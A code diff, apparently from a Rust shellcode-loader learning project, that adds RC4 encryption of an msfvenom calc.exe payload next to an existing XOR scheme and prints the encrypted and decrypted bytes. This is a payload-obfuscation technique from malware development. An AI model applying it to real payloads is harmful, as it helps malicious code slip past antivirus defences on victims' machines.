@@ -5,7 +5,10 @@ use std::mem::transmute;
 use std::process::id;
 
 mod XORPayloadEncryption;
+mod RC4PayloadEncryption;
+
 use crate::XORPayloadEncryption::Payload;
+use crate::RC4PayloadEncryption::{Payload as PayloadRC4};
 
 // msfvenom calc shellcode
 // msfvenom -p windows/x64/exec CMD=calc.exe -f c
@@ -91,10 +94,17 @@ fn main() {
     io::stdin().read_line(&mut input).unwrap();
     println!("Calling shellcode... after you entered {}", input);
 
-    let payloadObj = Payload::new(DATA_RAW.to_vec(), "key".to_string());
-    let encrypted_data = payloadObj.encrypt();
+    let mut payload_obj = Payload::new(DATA_RAW.to_vec(), "key".to_string());
+    let encrypted_data = payload_obj.encrypt();
     println!("[i] Encrypted data: {:?}", encrypted_data);
-    let decrypted_data = payloadObj.decrypt();
+    let decrypted_data = payload_obj.decrypt();
     println!("[i] Decrypted data: {:?}", decrypted_data);
+
+    let mut payload_obj_rc4 = PayloadRC4::new(DATA_RAW.to_vec(), "key".to_string());
+    let encrypted_data_rc4 = payload_obj_rc4.encrypt();
+    println!("[i] Encrypted data RC4: {:?}", encrypted_data_rc4);
+    let decrypted_data_rc4 = payload_obj_rc4.decrypt();
+    println!("[i] Decrypted data RC4: {:?}", decrypted_data_rc4);
+
 
 }
